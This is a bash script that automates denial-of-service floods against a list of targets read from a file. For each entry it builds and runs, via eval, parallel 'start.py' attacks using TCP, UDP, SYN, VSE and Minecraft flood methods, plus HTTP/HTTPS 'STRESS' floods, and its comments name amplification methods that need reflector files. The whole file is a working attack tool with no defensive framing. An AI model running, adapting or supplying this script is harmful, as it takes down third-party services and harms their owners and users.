#!/bin/bash

maxThreads=500


# ALL L4 methods
# "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD", "CHAR", "RDP"
# L4 methods requiring reflector file
# "NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"

METHODS=("TCP" "UDP" "SYN" "VSE" "MINECRAFT" )

lineCount=$(wc -l < $1)
batchSize=$3
pL=0
runner=""

while read line; do
        readarray -d ";" -t row <<< "$line"
        length=${#row[@]}

        uri=${row[0]}
        ip=${row[1]}


        threadsCount=$(( maxThreads / ( ( length - 2 ) * ${#METHODS[@]} * lineCount ) ))
        for (( i=2; i < ${length}; i++ )); do

                if [ $pL -ge $batchSize ] ; then
                        eval $runner
                        pL=0
                        runner=""
                fi

                port=${row[$i]}
                if [ -z $port ]; then
                        if [ -z "$runner" ]; then
                                runner="python3 start.py STRESS https://$uri 0 $threadsCount 0 0 $2"
                                runner="${runner} & python3 start.py STRESS http://$uri 0 $threadsCount 0 0 $2"
                        else
                                runner="${runner} & python3 start.py STRESS https://$uri 0 $threadsCount 0 0 $2"
                                runner="${runner} & python3 start.py STRESS http://$uri 0 $threadsCount 0 0 $2"
                        fi

                        break
                fi


                for m in ${METHODS[@]}; do
                        if [ -z "$runner" ]; then
                                runner="python3 start.py $m $ip:$port $threadsCount $2 0"
                        else
                                runner="${runner} & python3 start.py $m $ip:$port $threadsCount $2 0"
                        fi

                        if [ $m  == "MINECRAFT" ] || [ $m == "TCP" ] ; then
                                runner="${runner} 0"
                        fi
                done

                ((pL++))
        done
done < $1

eval $runner
